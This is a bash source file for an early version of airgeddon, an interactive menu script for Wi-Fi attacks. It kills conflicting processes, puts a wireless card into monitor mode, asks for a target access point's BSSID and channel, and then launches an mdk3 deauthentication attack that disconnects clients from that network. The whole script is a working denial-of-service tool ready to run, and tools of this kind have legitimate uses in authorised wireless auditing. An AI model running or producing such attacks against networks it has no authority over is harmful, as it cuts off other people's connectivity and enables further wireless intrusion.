#!/bin/bash

version="1.0"

function check_monitor() {
	echo
	mode=`iwconfig $interface 2> /dev/null |cut -d ' ' -f 6`

	if [[ $mode == "Mode:Monitor" ]]; then
		echo_warning "This interface ($interface) is already in monitor mode"
		return 1
	fi
	return 0
}

function monitor() {
	
	check_monitor
	if [ "$?" != "0" ]; then
		return
	fi

	echo_prompt "Putting your interface in monitor mode..."
	echo_prompt "Please be patient. Maybe killing some conflicting processes..."
	ifconfig $interface up
	iwconfig $interface rate 1M > /dev/null 2>&1
	if [ "$?" != "0" ]; then
		echo
		echo_warning "This interface ($interface) doesn't support monitor mode. Choose another one..."
		echo
		set_interface
		monitor
		return
	fi

	airmon-ng check kill > /dev/null 2>&1

	new_interface=$(airmon-ng start $interface|grep monitor|cut -d ']' -f 3)
	new_interface=${new_interface:: -1}
	
	if [ "$interface" != "$new_interface" ]; then
		echo
		echo_warning "The interface changed its name while putting in monitor mode."
		interface=$new_interface
	fi
	
	echo
	echo_warning "Monitor mode now is set on $interface"
	sleep 2
}

function set_interface() {
	
	ifaces=`ifconfig |grep HWaddr|cut -d ' ' -f 1`
	echo_error "*****************************Interface selection********************************"
	echo_message "Select an interface to work with :"
        echo
	option_counter=0
	for item in $ifaces 
	do
		option_counter=$[option_counter + 1]
	        echo "$option_counter. $item"
	done
	read iface
	if [ -z $iface ]; then
		invalid_iface_option
		else if [[ $iface < 1 ]] || [[ $iface > $option_counter ]]; then
			invalid_iface_option
		else
			option_counter2=0
			for item2 in $ifaces 
			do
				option_counter2=$[option_counter2 + 1]
				if [[ "$iface" == "$option_counter2" ]]; then
					interface=$item2
					break;
				fi				
			done
		fi
	fi
}

function read_channel() {
	echo
	echo_message "Set channel (1-11) :"
	read channel
}

function read_bssid() {
	echo
	echo_message "Type target BSSID (example: 00:11:22:33:44:55) :"
	read bssid
}

function exec_mdk3deauth() {
	echo
	echo_error "*********************************Mdk3 action************************************"
	echo_message "All parameters set"
	
	echo $bssid > /tmp/bl

	echo
	echo_prompt "Starting mdk3 deauth attack. Kicking asses!! press Ctrl+C to stop..."
	mdk3 $interface d -b /tmp/bl -c $channel
}

function menu_options() {
	echo
	echo_error "************************************Menu****************************************"
	echo_message "Select your option :"
    echo 
    echo "1. Deauthentication / Disassociation mdk3 mode"
	echo "2. Credits & About"
    echo "3. Exit script"
	read option

if [ -z $option ]; then

	invalid_menu_option

	else if [ $option -eq 1 ]; then
		echo_error "*******************************Mdk3 parameters**********************************"
		echo_message "Deauthentication / Dissasociation mdk3 mode choosen"
	
		monitor

		while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
			read_bssid
		done
		echo
		echo_warning "BSSID set to ${bssid}"

		while [[ ! ${channel} =~ ^([1-9]|1[0-1])$ ]]; do
			read_channel
		done
		echo
		echo_warning "Channel set to ${channel}"
	
		exec_mdk3deauth
		
		else if [ $option -eq 2 ]; then
			credits

			else if [ $option -eq 3 ]; then
				exit_script
			else
				invalid_menu_option
			fi
		fi
	fi
fi

}

function credits() {
	
	echo_error "******************************Credits & About***********************************"
	echo
	echo "airgeddon script v$version developed by :"
	echo "       ____        ____  __   _______"
	echo "___  _/_   | _____/_   |/  |_ \   _  \_______"
	echo "\  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \ "
	echo " \   / |   |\___ \ |   ||  |  \  \_/   \  | \/"
	echo "  \_/  |___/____  >|___||__|   \_____  /__|"
	echo "                \/                   \/"
	echo "		      .-\"\"\"\"-."
	echo "		     /        \ "
	echo "		    /_        _\ "
	echo "		   // \      / \\\ "
	echo "		   |\__\    /__/|"
	echo "		    \    ||    /"
	echo "		     \        /"
	echo "		      \  __  / "
	echo "		       '.__.'"
	echo "		        |  |"
	echo
	echo "Thank you to MI1 for his airstorm script. I used some pieces of it."
	echo "The GPLv2 (or later) from the Free Software Foundation is the license that this script is under."
	menu_options
}

function invalid_menu_option() {
	echo	
	echo_warning -n "Invalid menu option was choosen"
	echo
	menu_options
}

function invalid_iface_option() {
	echo	
	echo_warning -n "Invalid interface was choosen"
	echo
	echo
	set_interface
}

function exit_script() {
	echo
	echo_error "************************************Exit****************************************"
	echo_prompt "Exiting airgeddon script - 2016 - See you soon! :)"
	echo
	exit 0
}

function welcome() {
	clear
	echo	
	echo_prompt "Welcome to airgeddon script"
	echo
	set_interface
	menu_options
}

function echo_message() {
  tput setaf 2; tput setab 0;
  echo $*
  tput sgr0
}

function echo_prompt() {
  tput setaf 4; tput setab 0;
  echo $*
  tput sgr0
}

function echo_warning() {
  tput setaf 3; tput setab 0;
  echo $*
  tput sgr0
}

function echo_error() {
  tput setaf 1; tput setab 0;
  echo $*
  tput sgr0
}

welcome
